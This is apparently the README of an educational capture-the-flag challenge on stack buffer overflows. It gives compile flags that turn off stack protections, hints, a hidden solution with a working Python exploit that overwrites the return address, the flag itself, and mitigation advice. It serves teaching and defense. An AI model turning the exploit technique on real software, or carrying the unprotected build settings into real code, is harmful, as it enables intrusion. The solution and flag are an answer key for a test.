# Buffer Overflow Challenge

## Overview
This challenge introduces participants to buffer overflow vulnerabilities, a common memory corruption issue that has been responsible for numerous security breaches. By exploiting a deliberately vulnerable program, participants will learn how memory corruption can lead to arbitrary code execution.

## Description
The challenge consists of a simple C program with a buffer overflow vulnerability in the `vulnerable_function()`. The goal is to craft an input that will overflow the buffer and redirect program execution to the `print_flag()` function, which is not called during normal program execution.

## Learning Objectives
- Understand how buffer overflows work
- Learn about memory layout in C programs
- Practice exploiting stack-based buffer overflows
- Understand return address overwriting
- Learn about basic binary exploitation techniques
- Recognize common programming mistakes that lead to memory corruption

## Setup Instructions

### Compilation
To compile the vulnerable program with the necessary flags to disable protections:

```bash
gcc -fno-stack-protector -z execstack -o vulnerable vulnerable.c
```

The compilation flags are important:
- `-fno-stack-protector`: Disables stack canaries that would prevent the overflow
- `-z execstack`: Makes the stack executable, allowing shellcode execution (not used in this basic challenge)

### Running the Program
Execute the program with an argument:

```bash
./vulnerable "test input"
```

## Challenge Tasks

### Basic Challenge
1. Understand how the program works by reading the source code
2. Identify the buffer overflow vulnerability
3. Determine the buffer size and the offset to the return address
4. Craft an input that will redirect execution to the `print_flag()` function
5. Execute the program with your crafted input to get the flag

### Advanced Challenge
1. Create a Python script to generate the exploit payload automatically
2. Try to exploit the program without knowing the address of `print_flag()` (e.g., by using pattern generation and offset calculation)
3. Implement a more complex exploit that executes shellcode instead of just jumping to `print_flag()`

## Hints

<details>
<summary>Hint 1: Understanding the Vulnerability</summary>
The vulnerability is in the `strcpy(buffer, input)` line. This function copies data without checking if the destination buffer is large enough to hold it.
</details>

<details>
<summary>Hint 2: Buffer Size</summary>
The buffer size is 64 bytes. Any input longer than this will start overwriting adjacent memory.
</details>

<details>
<summary>Hint 3: Return Address</summary>
On most systems, you'll need to overflow the buffer, then the saved base pointer (usually 4 or 8 bytes depending on architecture), and then you can overwrite the return address.
</details>

<details>
<summary>Hint 4: Crafting the Payload</summary>
Your payload should consist of:
- Enough bytes to fill the buffer (64 bytes)
- Bytes to overwrite the saved base pointer (4 or 8 bytes)
- The address of print_flag() (in little-endian format)
</details>

## Solution

<details>
<summary>Click to reveal solution</summary>

### Understanding the Exploit

To exploit this buffer overflow:

1. We need to fill the 64-byte buffer
2. Then overwrite the saved base pointer (8 bytes on 64-bit systems, 4 bytes on 32-bit)
3. Finally, overwrite the return address with the address of `print_flag()`

### Example Exploit (Python)

```python
import struct
import subprocess
import sys

# Get the address of print_flag from the program output
def get_print_flag_address():
    output = subprocess.check_output(["./vulnerable", "AAAA"]).decode()
    for line in output.split('\n'):
        if "Address of print_flag()" in line:
            addr = line.split(': ')[1]
            return int(addr, 16)
    return None

# Create the exploit payload
def create_payload(print_flag_addr):
    # Fill the buffer with 'A's
    payload = b'A' * 64
    
    # Overwrite the saved base pointer with 'B's
    # (8 bytes on 64-bit systems, 4 bytes on 32-bit)
    payload += b'B' * 8  # Adjust this based on your system
    
    # Overwrite the return address with the address of print_flag
    # Pack the address in little-endian format
    payload += struct.pack("<Q", print_flag_addr)  # Use "<I" for 32-bit
    
    return payload

# Main exploit function
def exploit():
    print_flag_addr = get_print_flag_address()
    if not print_flag_addr:
        print("Failed to get print_flag address")
        return
    
    print(f"Address of print_flag(): 0x{print_flag_addr:x}")
    
    payload = create_payload(print_flag_addr)
    
    # Execute the vulnerable program with our payload
    try:
        subprocess.run(["./vulnerable", payload])
    except subprocess.CalledProcessError:
        print("Exploit likely succeeded with a crash")

if __name__ == "__main__":
    exploit()
```

### Notes on the Solution

- The exact payload may need adjustments based on your system architecture and compiler
- The offset to the return address might vary; you may need to experiment
- For more precise offset calculation, you can use pattern generation and analysis tools like those in the pwntools Python library

### The Flag
The flag is: `CTF{b4s1c_buff3r_0v3rfl0w_3xpl01t3d}`

</details>

## Mitigation Techniques

To prevent buffer overflow vulnerabilities in real-world code:

1. **Use safe functions**: Replace unsafe functions like `strcpy()` with safer alternatives like `strncpy()` or `strlcpy()`
2. **Input validation**: Always validate and sanitize user input
3. **Compiler protections**: Use stack canaries, ASLR, DEP/NX, and other compiler security features
4. **Memory-safe languages**: Consider using memory-safe languages like Rust, Go, or Python for security-critical applications
5. **Static analysis**: Use static analysis tools to detect potential buffer overflows

## Additional Resources
- [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html)
- [LiveOverflow's Binary Exploitation / Memory Corruption](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [Exploit Exercises - Protostar](https://exploit.education/protostar/)
- [OWASP Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)

## Credits
This challenge was created for educational purposes as part of a cybersecurity learning environment.

## Disclaimer
This challenge is for educational purposes only. The techniques demonstrated here should only be used on systems you have permission to test. Unauthorized exploitation of buffer overflows is illegal and unethical.